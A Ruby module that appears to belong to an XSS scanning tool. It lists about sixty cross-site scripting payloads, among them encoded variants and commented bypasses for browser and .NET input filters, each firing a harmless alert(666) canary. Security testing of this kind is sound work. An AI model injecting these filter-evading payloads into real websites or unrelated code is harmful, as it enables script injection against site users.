require 'securerandom'

module Cross
  module Attack
    class XSS
      CANARY = 666
      EVASIONS = [
          "a onmouseover=alert(#{Cross::Attack::XSS::CANARY})",
          "<script>alert(#{Cross::Attack::XSS::CANARY})</script>",
          "<script>alert(#{Cross::Attack::XSS::CANARY});</script>",
          "/--><script>alert(#{Cross::Attack::XSS::CANARY})</script>",
          "/--><script>alert(#{Cross::Attack::XSS::CANARY});</script>",
          "/--></ScRiPt><ScRiPt>alert(#{Cross::Attack::XSS::CANARY})</ScRiPt>",
          "/--></ScRiPt><ScRiPt>alert(#{Cross::Attack::XSS::CANARY});</ScRiPt>",
          "//;-->alert(#{Cross::Attack::XSS::CANARY})",
          "//;-->alert(#{Cross::Attack::XSS::CANARY});",
          "\"//;\nalert(#{Cross::Attack::XSS::CANARY})",
          "\"//;\nalert(#{Cross::Attack::XSS::CANARY});",
          # more exotic vectors (antisnatchor's collection)
          "<script/anyjunk>alert(#{Cross::Attack::XSS::CANARY})</script>",
          "<<script>alert(#{Cross::Attack::XSS::CANARY});//<</script>",
          "<img onerror=alert(#{Cross::Attack::XSS::CANARY}) src=a>",
          "<xml onreadystatechange=alert(#{Cross::Attack::XSS::CANARY})>",
          "<style onreadystatechange=alert(#{Cross::Attack::XSS::CANARY})>",
          "<iframe onreadystatechange=alert(#{Cross::Attack::XSS::CANARY})>",
          "<object onerror=alert(#{Cross::Attack::XSS::CANARY})>",
          "<object type=image src=/images/live.gif onreadystatechange=alert(#{Cross::Attack::XSS::CANARY})></object>",
          "<img type=image src=/images/live.gif onreadystatechange=alert(#{Cross::Attack::XSS::CANARY})>",
          "<input type=image src=/images/live.gif onreadystatechange=alert(#{Cross::Attack::XSS::CANARY})>",
          "<isindex type=image src=/images/live.gif onreadystatechange=alert(#{Cross::Attack::XSS::CANARY})>",
          "<script onreadystatechange=alert(#{Cross::Attack::XSS::CANARY})>",
          "<bgsound onpropertychange=alert(#{Cross::Attack::XSS::CANARY})>",
          "<body onbeforeactivate=alert(#{Cross::Attack::XSS::CANARY})>",
          "<body onfocusin=alert(#{Cross::Attack::XSS::CANARY})>",
          "<input autofocus onfocus=alert(#{Cross::Attack::XSS::CANARY})>",
          "<input onblur=alert(#{Cross::Attack::XSS::CANARY}) autofocus><input autofocus>",
          "<body onscroll=alert(#{Cross::Attack::XSS::CANARY})><br><br>...<br><input autofocus>",
          "</a onmousemove=alert(#{Cross::Attack::XSS::CANARY})>",
          "<video src=1 onerror=alert(#{Cross::Attack::XSS::CANARY})>",
          "<audio src=1 onerror=alert(#{Cross::Attack::XSS::CANARY})>",
          "<object data=javascript:alert(#{Cross::Attack::XSS::CANARY})>",
          "<iframe src=javascript:alert(#{Cross::Attack::XSS::CANARY})>",
          "<embed src=javascript:alert(#{Cross::Attack::XSS::CANARY})>",
          "<form id=test /><button form=test formaction=javascript:alert(#{Cross::Attack::XSS::CANARY})>",
          "<event-source src=javascript:alert(#{Cross::Attack::XSS::CANARY})>",
          "<x style=behavior:url(#default#time2) onbegin=alert(#{Cross::Attack::XSS::CANARY})>",
          "<x style=x:expression(alert(#{Cross::Attack::XSS::CANARY}))>",
          "<x onclick=alert(#{Cross::Attack::XSS::CANARY}) src=a>Click here</x>",
          "<img onerror=\"alert(#{Cross::Attack::XSS::CANARY})\"src=a>",
          "<img onerror=`alert(#{Cross::Attack::XSS::CANARY})`src=a>",
          "<img/onerror=\"alert(#{Cross::Attack::XSS::CANARY})\"src=a>",
          "<img onerror=a&#x6c;ert(#{Cross::Attack::XSS::CANARY}) src=a>",
          "<img onerror=a&#x06c;ert(#{Cross::Attack::XSS::CANARY}) src=a>",
          "<img onerror=a&#x006c;ert(#{Cross::Attack::XSS::CANARY}) src=a>",
          "<img onerror=a&#x0006c;ert(#{Cross::Attack::XSS::CANARY}) src=a>",
          "<img onerror=a&#108;ert(#{Cross::Attack::XSS::CANARY}) src=a>",
          "<img onerror=a&#0108;ert(#{Cross::Attack::XSS::CANARY}) src=a>",
          "<img onerror=a&#0108;ert(#{Cross::Attack::XSS::CANARY}) src=a>",
          "<img onerror=a&#108ert(#{Cross::Attack::XSS::CANARY}) src=a>",
          "<img onerror=a&#0108ert(#{Cross::Attack::XSS::CANARY}) src=a>",
          "<script>function::['alert'](#{Cross::Attack::XSS::CANARY})</script>",
          "<svg><script>//&#x0A;alert(#{Cross::Attack::XSS::CANARY})</script>", #Chrome <= 18 XssAuditor bypass
          "<script>/*///*/alert(#{Cross::Attack::XSS::CANARY});</script>", #Chrome <= 20 XssAuditor bypass
          "<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(#{Cross::Attack::XSS::CANARY}))>", #.NET RequestValidator bypass
          "+ADw-script+AD4-alert(#{Cross::Attack::XSS::CANARY})+ADw-/script+AD4-", # UTF-7
          "},alert(#{Cross::Attack::XSS::CANARY}),function x(){//", # DOM breaker
          "\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3ealert(#{Cross::Attack::XSS::CANARY})\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e" #DOM-based innerHTML injection
      ]

      def self.rand
        Cross::Attack::XSS::EVASIONS[SecureRandom.random_number(Cross::Attack::XSS::EVASIONS.size)]
      end

      def self.count
        Cross::Attack::XSS::EVASIONS.count
      end

      def self.each
        Cross::Attack::XSS::EVASIONS.each do |pattern|
          yield pattern if block_given?
        end
      end

    end
  end
end
